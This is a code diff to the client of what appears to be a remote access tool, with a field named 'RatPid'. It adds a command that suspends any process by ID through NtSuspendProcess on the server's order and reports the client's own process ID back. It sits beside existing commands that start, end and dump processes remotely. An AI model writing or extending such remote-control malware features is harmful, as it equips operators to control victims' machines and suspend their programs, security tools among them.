@@ -47,7 +47,8 @@ namespace Pulsar.Client.Messages
         public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                              message is DoProcessStart ||
                                                              message is DoProcessEnd ||
-                                                             message is DoProcessDump;
+                                                             message is DoProcessDump ||
+                                                             message is DoSuspendProcess;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -65,6 +66,9 @@ namespace Pulsar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoProcessDump msg:
+                    Execute(sender, msg);
+                    break;
+                case DoSuspendProcess msg:
                     Execute(sender, msg);
                     break;
             }
@@ -86,7 +90,9 @@ namespace Pulsar.Client.Messages
                 processes[i] = process;
             }
 
-            client.Send(new GetProcessesResponse { Processes = processes });
+            int currentPid = Process.GetCurrentProcess().Id;
+
+            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
         }
 
         private void Execute(ISender client, DoProcessStart message)
@@ -233,6 +239,29 @@ namespace Pulsar.Client.Messages
             else
             {
                 client.Send(new DoProcessDumpResponse { Result = success, DumpPath = "", Length = 0, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = dump, UnixTime = DateTime.Now.Ticks });
+            }
+        }
+
+        private void Execute(ISender client, DoSuspendProcess message)
+        {
+            try
+            {
+                Process proc = Process.GetProcessById(message.Pid);
+                if (proc != null)
+                {
+                    //why tf is there a native methods section in common and why is it being used.
+                    //TODO: Change that shit. The server should NEVER need any of that. Useless to store it there.
+                    Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = true });
+                }
+                else
+                {
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
+                }
+            }
+            catch
+            {
+                client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
             }
         }
 
